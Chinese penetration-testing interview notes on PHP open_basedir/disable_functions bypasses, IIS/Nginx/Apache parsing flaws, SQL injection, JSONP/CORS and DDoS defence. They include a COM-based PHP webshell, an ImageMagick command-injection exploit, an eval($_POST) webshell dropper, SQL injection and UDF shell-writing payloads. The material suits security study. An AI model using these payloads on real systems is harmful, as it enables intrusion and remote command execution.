> 示例0xA*1000指0xA后面”A"重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出

i)整合绕过
整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说是总体与局部和的关系，另一方面则是多种技术的使用创造了更多的可能性，除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。

### SQLi Filter的实现及Evasion
数字被过滤时,可以通过函数实现.

##  open_basedir,disable_functions
部分来源:https://www.jb51.net/article/141767.htm
部分来源:http://www.vuln.cn/6426
### open_basedir

> open_basedir是php.ini中的一个配置选项
> 它可将用户访问文件的活动范围限制在指定的区域，
> 假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。
> 注意用open_basedir指定的限制实际上是前缀,而不是目录名。
> 举例来说: 若"open_basedir = /dir/user", 那么目录 "/dir/user" 和 "/dir/user1"都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。
> 在php5.3以后很少有能够绕过open_basedir读写文件的方法

#### 命令执行函数
open_basedir的设置对system等命令执行函数是无效的，所以我们可以使用命令执行函数来访问限制目录.
在php.ini中设置好我们的open_basedir
> open_basedir = /home/puret/test/b/

编辑1.php(再b目录下)
```

```
<?php
  echo file_get_contents("../1.txt"); //非system函数
?>
```
~/test/b$ php 1.php
```
这样直接是无法访问的,明显我们无法直接读取open_basedir所规定以外的目录文件
用system函数尝试绕open_basedir的限制来删除1.txt(再test目录下)
编辑1.php(再b目录下)为

```
<?php
 system("rm -rf ../1.txt"); //system函数
?>
```
执行1.php之后

```
~/test/b$ php 1.php
```

1.txt被删除了

由于命令执行函数一般都会被限制在disable_function当中，所以我们需要寻找其他的途径来绕过限制

#### 利用DirectoryIterator + Glob 直接列举目录


> DirectoryIterator 是php5中增加的一个类，为用户提供一个简单的查看目录的接口
> glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径
> 结合这两个方式，我们就可以在php5.3以后对目录进行列举
> 在实测中，我们得知，此方法在Linux下列举目录居然可以无视open_basedir
这个方法也是迄今为止最方便的方法，他不用暴力猜解目录，而是直接列举。但他对php版本、系统版本有一定要求，在5.3以上可列举（5.5/5.6可能会有修复？在官方没看到有fix），需要在Linux下才能绕过open_basedir。

#### realpath列举目录

> Realpath函数是php中将一个路径规范化成为绝对路径的方法，它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。
> 在开启了open_basedir以后，这个函数有个特点：当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误


#### SplFileInfo::getRealPath列举目录
SplFileInfo类是PHP5.1.2之后引入的一个类，提供一个对文件进行操作的接口。其中有一个和realpath名字很像的方法叫getRealPath。

这个方法功能和realpath类似，都是获取绝对路径用的。我们在SplFileInfo的构造函数中传入文件相对路径，并且调用getRealPath即可获取文件的绝对路径。

这个方法有个特点：完全没有考虑open_basedir。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径。

我们的realpath函数还是考虑了open_basedir，只是在报错上没有考虑周全导致我们能够判断某个文件是否存在。但我们可爱的SplFileInfo::getRealPath方法是直接没有考虑open_basedir，就能够判断一个文件是否存在。

#### GD库imageftbbox/imagefttext列举目录
我拿imageftbbox举个例子，这个函数第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。

也就是说，我们可以通过抛出错误的具体内容来判断一个文件是否存在。这个方法和realpath有相似性，都会抛出open_basedir的错误。

#### symlink()函数
我们先来了解一下symlink函数

> bool symlink ( string $target , string $link )

symlink函数将建立一个指向target的名为link的符号链接，当然一般情况下这个target是受限于open_basedir的。
在Linux环境下我们可以通过symlink完成一些逻辑上的绕过导致可以跨目录操作文件

### disable_functions
参考:http://blog.leanote.com/post/xuxi/PHP-Webshell%E4%B8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%99%90%E5%88%B6%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95
用于禁用函数

#### 黑名单绕过
关注并收集php系统命令执行函数，补齐disable_function项

#### 系统组件绕过
适用于windows
1.  <?php
2.  $command=$_POST\[a\];
3.  $wsh = new COM('WScript.shell');   *// 生成一个COM对象*
4.  $exec = $wsh->exec('cmd.exe /c '.$command); *//调用对象方法来执行命令*
5.  $stdout = $exec->StdOut();
6.  $stroutput = $stdout->ReadAll();
7.  echo $stroutput
8.  ?>

Shell.Application也可以实现同样的效果

彻底的解决方案是 直接删除System32目录下wshom.ocx文件

#### 拓展库绕过
Linux下可通过编译拓展库进行绕过
防御方法：将dl函数加入disable_function中禁用

#### imagemagick组件
Delegate命令执行
%m被定义为输入的图片格式,也就是我们输入的url地址。但是由于只是做了简单的字符串拼接,所以我们可以将引号闭合后通过管道符带入其他命令,也就形成了命令注入。

比如url为:https://example.com"|ls "-la

那实际命令就变成了:

"wget" -q -O "%o" " https://example.com"|ls "-la"
ls –la被执行了。

EXP：

```php
<?php 
echo "Disable Functions: " . ini_get('disable_functions') . "\n"; 
 
$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd']; 
if ($command == '') {
    $command = 'id'; 
}
 
$exploit = <<<EOF 
push graphic-context 
viewbox 0 0 640 480 
fill 'url(https://example.com/image.jpg"|$command")' 
pop graphic-context 
EOF; 
 
file_put_contents("KKKK.mvg", $exploit); 
$thumb = new Imagick(); 
$thumb->readImage('KKKK.mvg'); 
$thumb->writeImage('KKKK.png'); 
$thumb->clear(); 
$thumb->destroy(); 
unlink("KKKK.mvg"); 
unlink("KKKK.png"); 
?>
```

## 短文件名
> windows下的短文件名是dos+fat12/fat16时代的产物，又称为8dot3命名法
> 8是指文件名或目录名的主体部分小于等于8个字符
> 3是指文件名或目录名的扩展部分小于等于3个字符
> 中间以 . 作为分割在FAT16文件系统中，由于FDT中的文件目录登记项只为文件名保留了8个字节，为扩展名保留了3个字节，所以DOS和Windows的用户为文件起名字时要受到8.3格式的限制
> 从win95开始，采用fat32已经支持长文件名
> 但是为了保持兼容性，保证低版本的程序能正确读取长文件名文件，每当创建新文件或新目录时，系统自动为所有长文件名文件创建了一个对应的短文件名。
> 使这个文件既可以用长文件名寻址，也可以用短文件名寻址。

### 开启查询
cmd中`fsutil 8dot3name query`查询是否开启,1为开启2为关闭

```
C:\Users\E1se>fsutil 8dot3name query
注册表状态为: 1 (禁用所有卷上的 8dot3 名称创建)。
```

### 命名规则

1）符合DOS短文件名规则的Windows下的长文件名不变。  
2）长文件名中的空格，在短文件名中被删除。  
3）删除空格后的长文件名，若长度大于8个字符，则取前6个字符，后两个字符以”~#”代替，其中”#”为数字，数字根据前六个字符相同的文件名的个数顺延。若个数(前8字符同名)超过10个则取前5个字符，后三个字符以”~##”代替，其中”##”为两位数字，若个数大于100也依此规则替换。  
4）对使用多个”．”隔开的长文件名，取最左端一段转换为短文件名，取最右一段前三个字符为扩展名。

### 漏洞利用
**漏洞环境：**一般是iis配上.net的 或者Apache+Windows

```
url="localhost/dedeCMS"
dir = '/data/backupdata/dede_a~'
for i in range(1,6):
    urls = 'http://'+url + dir + str(i) + '.txt'
...省略
```
可以直接读取文件

### 漏洞修复

通用有效方法:

禁用windows系统中的短文件名功能。  
打开注册表并打开此目录 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`  
修改 `NtfsDisable8dot3NameCreation` 的值为1 。  
修改完成后，需要重启系统生效。

**※需要注意**：即使关闭了短文件名功能，也不会删除原有创建过的短文件名。

## IIS解析漏洞
原文地址:http://drops.wooyun.org/papers/539

### 一、IIS 5.x/6.0解析漏洞


IIS 6.0解析利用方法有两种

1.目录解析

```
/xx.asp/xx.jpg

```

2.文件解析

```
wooyun.asp;.jpg 

```

第一种，在网站下建立文件夹的名字为 *.asp、*.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。

例如创建目录 wooyun.asp，那么

```
/wooyun.asp/1.jpg

```

将被当作asp文件来执行。假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了。

第二种，在IIS6.0下，分号后面的不被解析，也就是说

```
wooyun.asp;.jpg

```

会被服务器看成是wooyun.asp

还有IIS6.0 默认的可执行文件除了asp还包含这三种

```
/wooyun.asa
/wooyun.cer
/wooyun.cdx

```

乌云上的IIS 6.0解析漏洞利用案例

[http://www.wooyun.org/searchbug.php?q=IIS6.0](http://www.wooyun.org/searchbug.php?q=IIS6.0)

### 二、IIS 7.0/IIS 7.5/ Nginx <8.03畸形解析漏洞


Nginx解析漏洞这个伟大的漏洞是我国安全组织80sec发现的…

在默认Fast-CGI开启状况下,黑阔上传一个名字为wooyun.jpg，内容为

```
<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>

```

的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马 shell.php

这个漏洞案例

[WooYun: 用友软件某分站SQL注入漏洞+nginx解析漏洞](http://www.wooyun.org/bugs/wooyun-2013-032250)

[WooYun: 新浪网分站多处安全漏洞（nginx解析+SQL注射等）小礼包](http://www.wooyun.org/bugs/wooyun-2013-021064)

[WooYun: kingsoft.com某x级域名nginx解析漏洞+爆路径](http://www.wooyun.org/bugs/wooyun-2013-019253)

### 三、Nginx <8.03 空字节代码执行漏洞


影响版:0.5.*,0.6.*, 0.7 <= 0.7.65, 0.8 <= 0.8.37

Nginx在图片中嵌入PHP代码然后通过访问

```
xxx.jpg%00.php

```

来执行其中的代码

Nginx 空字节代执行漏洞案例

[http://www.wooyun.org/searchbug.php?q=%2500.php](http://www.wooyun.org/searchbug.php?q=%2500.php)

### 四、Apache解析漏洞


Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.

比如 wooyun.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php.

如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个wooyun.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀

Apache解析漏洞案例

[http://www.wooyun.org/searchbug.php?q=apache%E8%A7%A3%E6%9E%90](http://www.wooyun.org/searchbug.php?q=apache%E8%A7%A3%E6%9E%90)

### 五、其他


在windows环境下，xx.jpg\[空格\] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。

如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入: 

```
<FilesMatch "wooyun.jpg"> SetHandler application/x-httpd-php </FilesMatch>

```

然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件。  


# ljf的面试总结文档补充
## JSON
1. 自己拼接的json语句 
2. 参数污染，json数据会用后面的覆盖前面的

### jsonp(规避同源策略)
来源: https://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html
JSONP是怎么产生的:

1. 主要是为了解决xmlhttprequest的跨域请求的问题，使用jsonp的方式解决跨域的问题
2. Ajax直接请求普通文件存在跨域无权限访问的问题，甭管你是静态页面、动态网页、web服务、WCF，只要是跨域请求，一律不准；
3. 不过我们又发现，Web页面上调用js文件时则不受是否跨域的影响（不仅如此，我们还发现凡是拥有"src"这个属性的标签都拥有跨域的能力，比如`<script>、<img>、<iframe>`；
4. 于是可以判断，当前阶段如果想通过纯web端（ActiveX控件、服务端代理、属于未来的HTML5之Websocket等方式不算）跨域访问数据就只有一种可能，那就是在远程服务器上设法把数据装进js格式的文件里，供客户端调用和进一步处理
5. 恰巧我们已经知道有一种叫做JSON的纯字符数据格式可以简洁的描述复杂数据，更妙的是JSON还被js原生支持，所以在客户端几乎可以随心所欲的处理这种格式的数据
6. 这样子解决方案就呼之欲出了，web客户端通过与调用脚本一模一样的方式，来调用跨域服务器上动态生成的js格式文件（一般以JSON为后缀），显而易见，服务器之所以要动态生成JSON文件，目的就在于把客户端需要的数据装入进去
7. 为了便于客户端使用数据，逐渐形成了一种非正式传输协议，人们把它称作JSONP，该协议的一个要点就是允许用户传递一个callback参数给服务端，然后服务端返回数据时会将这个callback参数作为函数名来包裹住JSON数据，这样客户端就可以随意定制自己的函数来自动处理返回数据了



#### 注入
1. callback的输入点存在注入 
2. 还是一个referer的问题，如果空referer或者过滤不严，就会存在这样的问题 
3. 其实基本已经是一个csrf的问题了

## 命令执行
常见函数

```
system() exec() shell_exec() passthru() popen()  passthru() popen() proc_open()

```
防御:
使用参数白名单，对输入的内容进行限制

## WAF原理
硬件、软件、云waf 

### 部署方式：
1. 在web服务前加一个waf（简单） 
2. 使用反向代理，在代理服务器上监控流量（需要配置大量的DNS与ip，比较麻烦）
3. 静态的端口镜像模式，交换机会把流量给一份给waf，只做监控和报警，流量只进不出

## 内网渗透

### Windows

### linux

# leezj 补充
来源: https://github.com/Leezj9671/Pentest_Interview/blob/master/%E6%8A%80%E6%9C%AF%E9%9D%A2%20%E5%88%86%E4%BA%AB.md

## 如何防御DDOS
-   网络设备设施
    -   拼带宽，加大带宽，但是成本太高
    -   使用硬件防火墙
    -   选用高性能设备
-   抗D思想和方案
    -   负载均衡
    -   花钱买流量清洗服务
    -   CDN：web层，比如cc攻击
    -   分布式集群防御
    -   高防：防大部分攻击，udp、大型的cc攻击
-   预防为主
    -   系统漏洞
    -   系统资源优化：
    -   过滤不必要的服务和端口
    -   限制特定流量：检查访问来源做适当限制

## 主机被入侵

1.  优先提取易消失的数据
    -   内存信息
    -   系统进程`free -m`
    -   路由信息`tracert`
2.  `ifconfig`查看网卡流量，检查网卡的发送、接收数据情况
3.  `NetHogs`实时监控带宽占用状况
4.  查看Linux系统日志 `/var/log`
5.  `ClamAV`杀毒软件

## 渗透测试流程

1.  项目访谈
2.  信息收集：whois、网站源IP、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息
3.  漏洞扫描：Nessus, AWVS
4.  手动挖掘：逻辑漏洞
5.  验证漏洞
6.  修复建议
7.  （如果有）基线检查/复验漏洞
8.  输出报告
    -   概述
    -   测试基本信息
        -   测试范围
        -   测试时间
        -   测试任务
        -   测试过程
    -   信息安全风险综合分析
        -   整体风险分析
        -   风险影响分析
        -   系统安全分析
        -   安全漏洞列表
    -   解决方案建议
    -   复测报告

## 17年OWASP TOP10

-   注入:sql,nosql,ldap,os
-   失效的身份认证:
-   敏感信息泄漏
-   XXE XML外部实体
-   失效的访问控制：管理页面仅能管理员权限访问；越权漏洞
-   安全配置错误：页面错误信息，默认密码，使用已知漏洞的应用
-   XSS
-   不安全的反序列化：一个PHP论坛使用PHP对象序列化来保存一个cookie，用户修改cookie即可伪造管理员登陆
-   使用含有已知漏洞的组件：比如structs2框架
-   不足的日志记录和监控：代码被删除，无法溯源；记录登陆失败次数；监控问题没被管理员响应

## 常见的Web安全漏洞

-   SQL注入
-   XSS
-   文件遍历、文件上传、文件下载
-   垂直越权、水平越权
-   逻辑漏洞

## MySQL面试题
### 什么是事务？

事务是一组原子性的SQL语句或者说是一个独立的工作单元，如果数据库引擎能够成功对数据库应用这组SQL语句，那么就执行，如果其中有任何一条语句因为崩溃或其它原因无法执行，那么所有的语句都不会执行。也就是说，事务内的语句，要么全部执行成功，要么全部执行失败

### GPC是什么？GPC之后怎么绕过？

如果`magic_quotes_gpc=On`，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染。

- 可以尝试从session中提交数据
- 二次编码
- 函数处理,如substr($_GET['a'], 1);

### Mysql一个@和两个@什么区别

-   @为用户变量，使用`SET @var1=1`赋值
-   @@ 为系统变量 ，包括全局变量`show global variables \G;`和会话变量`show session variables \G;`

### 注入/绕过常用的函数

1.  基于布尔SQL盲注
    -   `left(database(),1)>'s'`
    -   `ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+`
    -   `ascii(substr((select database()),1,1))=98`
    -   `ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98%23`
    -   `regexp`正则注入 `select user() regexp '^[a-z]';`
    -   `select user() like 'ro%'`
2.  基于报错的SQL盲注
    -   `Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;`

### 各种写shell的问题

1.  写shell用什么函数？
    -   `select '<?php phpinfo()> into outfile 'D:/shelltest.php'`
    -   `dumpfile`
    -   `file_put_contents`???
2.  outfile不能用了怎么办？ `select unhex('udf.dll hex code') into dumpfile 'c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll';`可以UDF提权 [https://www.cnblogs.com/milantgh/p/5444398.html](https://www.cnblogs.com/milantgh/p/5444398.html)
3.  dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。
5.  写shell的条件？
    -   用户权限
    -   目录读写权限
    -   防止命令执行：`disable_functions`，禁止了`disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source`，但是可以用dl扩展执行命令或者ImageMagick漏洞 [https://www.waitalone.cn/imagemagic-bypass-disable_function.html](https://www.waitalone.cn/imagemagic-bypass-disable_function.html)
    -   open_basedir: 将用户可操作的文件限制在某目录下


### mysql的网站注入，5.0以上和5.0以下有什么区别？

-   5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。
-   5.0以下是多用户单操作，5.0以上是多用户多操做。


## CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？
XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。

CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.

XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。

## CSRF、SSRF和重放攻击有什么区别？

-   CSRF是跨站请求伪造攻击，由客户端发起
-   SSRF是服务器端请求伪造，由服务器发起
-   重放攻击是将截获的数据包进行重放，达到身份认证等目的


## 啥是同源策略，跨域有几种方式？
浏览器安全的基石是"同源政策"，目的是为了保证用户的信息安全，防止恶意网站窃取数据，避免cookie共享。
同源含义是协议、域名、端口相同的两个网页才可以共用cookie。目前如果非同源，有三种行为收到限制： - Cookie、LocalStorage 和 IndexDB 无法读取。 - DOM 无法获得。 - AJAX 请求不能发送

同协议、同域名、同端口才能互相信任与通信 有src标签的是不受同源的影响的，但是没有读和写的权限 ﬂash又crossdomain.xml可以使用，来给予跨域的权限,js不受同源策略影响.


## 如何规避同源策略？

### JSONP

向服务器请求json数据回调，一般请求URL会加上`&callback=xx`

```shell
foo({
  "ip": "8.8.8.8"
});
```

由于`<script>`元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用JSON.parse的步骤。

#### JSONP的劫持

> [http://blog.knownsec.com/2015/03/jsonp\_security\_technic/](http://blog.knownsec.com/2015/03/jsonp_security_technic/)

防御：

1.  验证 JSON 文件调用的来源（ Referer ），但是Referer 过滤（正则）不严谨、空 Referer也不行
2.  随机token

### WebSocket

WebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。

### CORS(重点)

> [http://www.ruanyifeng.com/blog/2016/04/cors.html](http://www.ruanyifeng.com/blog/2016/04/cors.html)

CORS是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是W3C标准，是跨源AJAX请求的根本解决方法。相比JSONP只能发GET请求，CORS允许任何类型的请求。 CORS请求大致和ajax请求，但是在头信息中加上了Origin字段表明请求来自哪个源。如果orgin是许可范围之内的话，服务器返回的响应会多出`Acess-Control-Allow-*`的字段

#### 与JSONP的比较

CORS与JSONP的使用目的相同，但是比JSONP更强大。

JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。

## HTTP协议

### 四层模型
1.  应用层 应用层对应于OSI参考模型的高层，为用户提供所需要的各种服务，例如：FTP、Telnet、DNS、SMTP等.
2.  传输层 传输层对应于OSI参考模型的传输层，为应用层实体提供端到端的通信功能，保证了数据包的顺序传送及数据的完整性。该层定义了两个主要的协议：传输控制协议（TCP）和用户数据报协议（UDP). TCP协议提供的是一种可靠的、通过“三次握手”来连接的数据传输服务；而UDP协议提供的则是不保证可靠的（并不是不可靠）、无连接的数据传输服务.
3.  网际互联层 网际互联层对应于OSI参考模型的网络层，主要解决主机到主机的通信问题。它所包含的协议设计数据包在整个网络上的逻辑传输。注重重新赋予主机一个IP地址来完成对主机的寻址，它还负责数据包在多种网络中的路由。该层有三个主要协议：网际协议（IP）、互联网组管理协议（IGMP）和互联网控制报文协议（ICMP）。 IP协议是网际互联层最重要的协议，它提供的是一个可靠、无连接的数据报传递服务。
4.  网络接入层（即主机-网络层） 网络接入层与OSI参考模型中的物理层和数据链路层相对应。它负责监视数据在主机和网络之间的交换。事实上，TCP/IP本身并未定义该层的协议，而由参与互连的各网络使用自己的物理层和数据链路层协议，然后与TCP/IP的网络接入层进行连接。地址解析协议（ARP）工作在此层，即OSI参考模型的数据链路层。

### 当你输入一个网址，点击访问，会发生什么？

#### 查找DNS记录

1.  查看浏览器缓存
2.  查看系统缓存
3.  查看路由器缓存
4.  查找ISP DNS缓存
5.  递归搜索。根据网址，发送一个DNS请求，UDP请求，端口为543，会请求一个DNS服务器，DNS服务器会不断递归查找这个网址的IP

#### 建立连接
2.  跟获取到的IP建立TCP连接，在TCP连接上发送HTTP报文

### 常见状态码

- 2xx地相应结果表明请求被正常处理了. 成功
- 3xx响应结果表明浏览器需要执行默写特殊的处理以正确的处理请求. 重定向
- 4xx的响应结果表明客户端是发生错误的原因所在.
- 5xx 表明服务器本身发生错误

### osi七层
物理层、数据链路层、网络层、传输层(TCP，UDP)、会话层(RPC，SQL)、表示层(定义数据格式及加密)、应用层(TELNET，HTTP，FTP)

## 补充
### DDOS和CC的区别
DDoS是针对IP的攻击，而CC攻击的是网页

ddos

- DDOS发送的是伪造的ip,非正常的数据包(syn,flood)等

cc

- CC攻击来的IP都是真实的，分散的；
- CC攻击的数据包都是正常的数据包；
- CC攻击的请求，全都是有效的请求，无法拒绝的请求；

### land攻击是什么
LAND攻击（局域网拒绝服务攻击)DoS攻击的一种

### web常用的加密算法有什么

非对称加密 RSA、ElGamal、Rabin 对称加密 DES、3DES、AES 散列算法 MD5 SHA base64

### 做了cdn的网站如何获取真实IP

1.  多地ping看是否有cdn
2.  邮件订阅或者rss订阅
3.  二级域名可能不会做cdn
4.  nslookup [http://xxx.com](http://xxx.com/) 国外dns
5.  查找域名历史解析记录，因为域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址 [https://toolbar.netcraft.com/site_report?url=www.xxx.com](https://toolbar.netcraft.com/site_report?url=www.xxx.com)
6.  phpinfo上显示的信息

### sleep被禁用后还能怎么进行sql注入

BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句使数据库查询时间变长，从而达到延时注入的效果。

## 个人补充
### 端口扫描器原理
端口扫描器原理很简单，就是操作socket，能connect就认定这个端口开放着。

#### TCP
最简单的端口扫描工具使用TCP连接扫描的方式，即利用操作系统原生的网络功能，且通常作为SYN扫描的替代选项
如果该端口是开放的，操作系统就能完成TCP三次握手，然后端口扫描工具会立即关闭刚建立的该连接，防止拒绝服务攻击。这种扫描模式的优势是用户无需特殊权限。但使用操作系统原生网络功能不能实现底层控制，因此这种扫描方式并不流行。并且TCP扫描很容易被发现，尤其作为端口清扫的手段：这些服务会记录发送者的IP地址，入侵检测系统可能触发警报

#### SYN
还有另外一种扫描方式是SYN扫描，端口扫描工具不使用操作系统原生网络功能，而是自行生成、发送IP数据包，并监控其回应。这种扫描模式被称为“半开放扫描”，因为它从不建立完整的TCP连接。端口扫描工具生成一个SYN包，如果目标端口开放，则会返回SYN-ACK包。扫描端回应一个RST包，然后在握手完成前关闭连接。如果端口关闭了但未使用过滤，目标端口应该会持续返回RST包。这种粗略的网络利用方式有几个优点：给扫描工具全权控制数据包发送和等待回应时长的权力，允许更详细的回应分析。关于哪一种对目标主机的扫描方式更不具备入侵性存在一些争议，但SYN扫描的优势是从不会建立完整的连接。然而，RST包可能导致网络堵塞，尤其是一些简单如打印机之类的网络设备。

# 渗透工具系列
由于很少使用自动化工具,这里分开专门总结




# HR绕过
参考来源: https://github.com/Leezj9671/Pentest_Interview/blob/master/HR%E9%97%AE%E9%A2%98.md

本来暂时没有必要做这种非技术类的总结,但是看到了大佬的系列总结还是记录下吧.

## 对我们公司有什么了解，为什么选择本公司
提前了解这个公司的产品

## 对安全服务是怎么理解的
为了业务和人服务,直接面对的对象是网站/系统.

-   安全概念和资讯
-   安全工具使用
-   渗透测试
-   安全基线检查
-   应急响应
-   代码审计
-   安全边界建设
-   安全规范

## 什么是渗透测试
证明网络防御按照预期计划正常运行而提供的一种机制,模拟黑客攻击系统,来发现漏洞,评估安全性.
渗透测试是指渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，以期发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并提交给网络所有者。网络所有者根据渗透人员提供的渗透测试报告，可以清晰知晓系统中存在的安全隐患和问题。

## 你还要问什么问题

-   个人：有没有岗位晋升机制，入职培训项目，员工培训提升项目。五险一金，社保比例，饭补、餐补、交通补助
-   公司：岗位具体职责
-   具体工作内容？会不会经常出差？
-   试用期多久？薪水多少？

## 最有影响的一件事/人

（最好是在安全领域方面的）